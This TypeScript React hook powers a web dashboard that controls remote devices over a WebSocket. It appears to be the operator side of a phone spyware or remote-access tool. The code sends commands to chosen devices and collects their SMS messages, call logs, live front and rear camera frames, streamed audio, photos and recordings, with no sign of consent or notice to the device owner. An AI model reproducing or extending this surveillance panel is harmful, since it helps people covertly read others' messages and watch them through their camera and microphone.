import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { apiUrl, wsUrlForControl } from '../lib/helpers'
import type { Device, DeviceHealth, HealthResponse, WsState, SMS, Call, Photo, CameraFrame, Recording } from '../types/dashboard'

export type AudioDataCallback = (data: ArrayBuffer, deviceId: string) => void
export type WebRTCMessageCallback = (msg: Record<string, unknown>) => void
export type CameraFrameCallback = (frame: CameraFrame) => void

export function useDashboard(
  onAudioData?: AudioDataCallback,
  onWebRTCMessage?: WebRTCMessageCallback,
  onCameraFrame?: CameraFrameCallback
) {
  const [wsState, setWsState] = useState<WsState>('connecting')
  const [devices, setDevices] = useState<Device[]>([])
  const [selectedDeviceId, setSelectedDeviceId] = useState<string>('')
  const [serverHealth, setServerHealth] = useState<HealthResponse | null>(null)
  const [feed, setFeed] = useState<string[]>([])
  const [photos, setPhotos] = useState<Photo[]>([])
  const [recordings, setRecordings] = useState<Recording[]>([])
  const wsRef = useRef<WebSocket | null>(null)
  const reconnectTimerRef = useRef<number | null>(null)

  const selectedDevice = useMemo(
    () => devices.find((device) => device.deviceId === selectedDeviceId) ?? null,
    [devices, selectedDeviceId],
  )

  const addFeed = useCallback((message: string) => {
    const stamped = `${new Date().toLocaleTimeString()}  ${message}`
    setFeed((prev) => [...prev, stamped].slice(-80))
  }, [])

  const upsertDevice = useCallback((next: Partial<Device> & { deviceId: string }) => {
    setDevices((prev) => {
      const idx = prev.findIndex((item) => item.deviceId === next.deviceId)
      if (idx === -1) {
        return [next as Device, ...prev]
      }
      const clone = [...prev]
      clone[idx] = { 
        ...clone[idx], 
        ...next, 
        health: { ...clone[idx].health, ...next.health },
        sms: next.sms ?? clone[idx].sms,
        calls: next.calls ?? clone[idx].calls,
      }
      return clone
    })
  }, [])

  const removeDevice = useCallback((deviceId: string) => {
    setDevices((prev) => prev.filter((item) => item.deviceId !== deviceId))
    setSelectedDeviceId((prev) => (prev === deviceId ? '' : prev))
  }, [])

  const sendCommand = useCallback(
    (cmd: string, extra: Record<string, unknown> = {}) => {
      const ws = wsRef.current
      const targetId = selectedDeviceId || devices[0]?.deviceId
      if (!ws || ws.readyState !== WebSocket.OPEN || !targetId) {
        addFeed(`Cannot send ${cmd}: no active control channel or device`)
        return
      }
      ws.send(JSON.stringify({ cmd, deviceId: targetId, ...extra }))
      addFeed(`Sent ${cmd} to ${targetId}`)
    },
    [addFeed, devices, selectedDeviceId],
  )

  useEffect(() => {
    let stopped = false

    const connect = () => {
      setWsState('connecting')
      const ws = new WebSocket(wsUrlForControl())
      wsRef.current = ws

      ws.binaryType = 'arraybuffer'
      
      ws.addEventListener('open', () => {
        setWsState('open')
        addFeed('Control WebSocket connected')
      })

      ws.addEventListener('message', (event) => {
        // Handle binary audio data
        if (event.data instanceof ArrayBuffer) {
          if (onAudioData && event.data.byteLength > 4) {
            // Extract device ID from frame header
            const view = new DataView(event.data)
            const deviceIdLen = view.getUint16(0, false)
            if (event.data.byteLength >= 2 + deviceIdLen) {
              const deviceIdBytes = new Uint8Array(event.data, 2, deviceIdLen)
              const deviceId = new TextDecoder().decode(deviceIdBytes)
              onAudioData(event.data, deviceId)
            }
          }
          return
        }

        if (typeof event.data !== 'string') {
          return
        }

        try {
          const msg = JSON.parse(event.data) as Record<string, unknown>
          const type = String(msg.type || '')

          if (type === 'device_list' && Array.isArray(msg.devices)) {
            const list = msg.devices as Device[]
            setDevices(list)
            if (list[0]?.deviceId) {
              setSelectedDeviceId((prev) => prev || list[0].deviceId)
            }
            addFeed(`Loaded device list (${list.length})`)
            return
          }

          if (type === 'device_connected') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            upsertDevice({
              deviceId,
              model: String(msg.model || 'Unknown'),
              health: (msg.health as DeviceHealth | undefined) || {},
            })
            setSelectedDeviceId((prev) => prev || deviceId)
            addFeed(`Device connected: ${deviceId}`)
            return
          }

          if (type === 'device_info') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            upsertDevice({
              deviceId,
              model: String(msg.model || 'Unknown'),
              sdk: Number(msg.sdk || 0),
              appVersionName: String(msg.appVersionName || ''),
              appVersionCode: Number(msg.appVersionCode || 0),
            })
            return
          }

          if (type === 'device_health') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            upsertDevice({
              deviceId,
              health: (msg.health as DeviceHealth | undefined) || {},
            })
            return
          }

          if (type === 'device_disconnected') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            removeDevice(deviceId)
            addFeed(`Device disconnected: ${deviceId}`)
            return
          }

          // Handle device data (SMS, calls)
          if (type === 'device_data') {
            const deviceId = String(msg.deviceId || '')
            if (!deviceId) return
            const data = msg.data as Record<string, unknown> | undefined
            if (!data) return
            
            // Parse SMS messages
            const rawSms = data.sms as Array<Record<string, unknown>> | undefined
            const sms: SMS[] = (rawSms || []).map((s, i) => ({
              id: String(s.id || i),
              sender: String(s.address || 'Unknown'),
              body: String(s.body || ''),
              timestamp: new Date(Number(s.date || Date.now())).toISOString(),
              type: s.type === 'inbox' ? 'inbox' : s.type === 'sent' ? 'sent' : s.type === 'draft' ? 'draft' : 'other',
              read: Boolean(s.read),
            }))

            // Parse call log
            const rawCalls = data.callLog as Array<Record<string, unknown>> | undefined
            const calls: Call[] = (rawCalls || []).map((c, i) => ({
              id: String(c.id || i),
              number: String(c.number || 'Unknown'),
              name: c.name ? String(c.name) : undefined,
              type: c.type === 'incoming' ? 'incoming' : c.type === 'outgoing' ? 'outgoing' : c.type === 'missed' ? 'missed' : c.type === 'rejected' ? 'rejected' : 'other',
              duration: c.duration ? Number(c.duration) : undefined,
              timestamp: new Date(Number(c.date || Date.now())).toISOString(),
            }))

            upsertDevice({ deviceId, sms, calls })
            addFeed(`Device data received: ${sms.length} SMS, ${calls.length} calls`)
            return
          }

          // Handle photo saved
          if (type === 'photo_saved') {
            const deviceId = String(msg.deviceId || '')
            const photo: Photo = {
              id: String(msg.filename || Date.now()),
              filename: String(msg.filename || ''),
              url: String(msg.url || ''),
              camera: msg.camera === 'front' ? 'front' : 'rear',
              quality: msg.quality === 'fast' ? 'fast' : msg.quality === 'hd' ? 'hd' : 'normal',
              aiEnhanced: Boolean(msg.aiEnhanced),
              size: Number(msg.size || 0),
              timestamp: new Date(Number(msg.ts || Date.now())).toISOString(),
            }
            setPhotos(prev => [photo, ...prev].slice(0, 50))
            addFeed(`Photo saved: ${photo.filename}`)
            return
          }

          // Handle live camera frame
          if (type === 'camera_live_frame') {
            if (onCameraFrame) {
              const frame: CameraFrame = {
                deviceId: String(msg.deviceId || ''),
                camera: msg.camera === 'front' ? 'front' : 'rear',
                quality: String(msg.quality || 'normal'),
                mime: String(msg.mime || 'image/jpeg'),
                data: String(msg.data || ''),
                timestamp: Number(msg.ts || Date.now()),
              }
              onCameraFrame(frame)
            }
            return
          }

          // Handle recording saved
          if (type === 'recording_saved') {
            const recording: Recording = {
              id: String(msg.filename || Date.now()),
              filename: String(msg.filename || ''),
              duration: 0,
              size: 0,
              timestamp: new Date().toISOString(),
              url: `/recordings/${msg.filename}`,
            }
            setRecordings(prev => [recording, ...prev].slice(0, 50))
            addFeed(`Recording saved: ${recording.filename}`)
            return
          }

          // Handle command acknowledgments
          if (type === 'command_ack' || type === 'ack') {
            const cmd = String(msg.command || msg.message || '')
            addFeed(`ACK: ${cmd}`)
            return
          }

          // Handle WebRTC signaling messages
          if (type === 'webrtc_answer' || type === 'webrtc_ice' || type === 'webrtc_state') {
            if (onWebRTCMessage) {
              onWebRTCMessage(msg)
            }
            addFeed(`Event: ${type}`)
            return
          }

          if (type === 'error') {
            addFeed(`Server error: ${String(msg.message || 'unknown')}`)
            return
          }

          if (type) {
            addFeed(`Event: ${type}`)
          }
        } catch {
          addFeed('Received non-JSON control message')
        }
      })

      ws.addEventListener('close', () => {
        setWsState('closed')
        if (stopped) return
        addFeed('Control WebSocket disconnected, retrying...')
        reconnectTimerRef.current = window.setTimeout(connect, 2000)
      })
    }

    connect()

    return () => {
      stopped = true
      if (reconnectTimerRef.current) {
        clearTimeout(reconnectTimerRef.current)
      }
      wsRef.current?.close()
    }
  }, [addFeed, removeDevice, upsertDevice, onAudioData, onWebRTCMessage, onCameraFrame])

  useEffect(() => {
    let stopped = false

    const loadHealth = async () => {
      try {
        const res = await fetch(apiUrl('/health'))
        const json = (await res.json()) as HealthResponse
        if (!stopped) {
          setServerHealth(json)
        }
      } catch {
        if (!stopped) {
          setServerHealth(null)
        }
      }
    }

    loadHealth()
    const id = window.setInterval(loadHealth, 15000)
    return () => {
      stopped = true
      clearInterval(id)
    }
  }, [])

  useEffect(() => {
    if (selectedDeviceId) {
      return
    }
    if (devices[0]?.deviceId) {
      setSelectedDeviceId(devices[0].deviceId)
    }
  }, [devices, selectedDeviceId])

  return {
    wsState,
    devices,
    selectedDevice,
    selectedDeviceId,
    serverHealth,
    feed,
    photos,
    recordings,
    setSelectedDeviceId,
    sendCommand,
  }
}
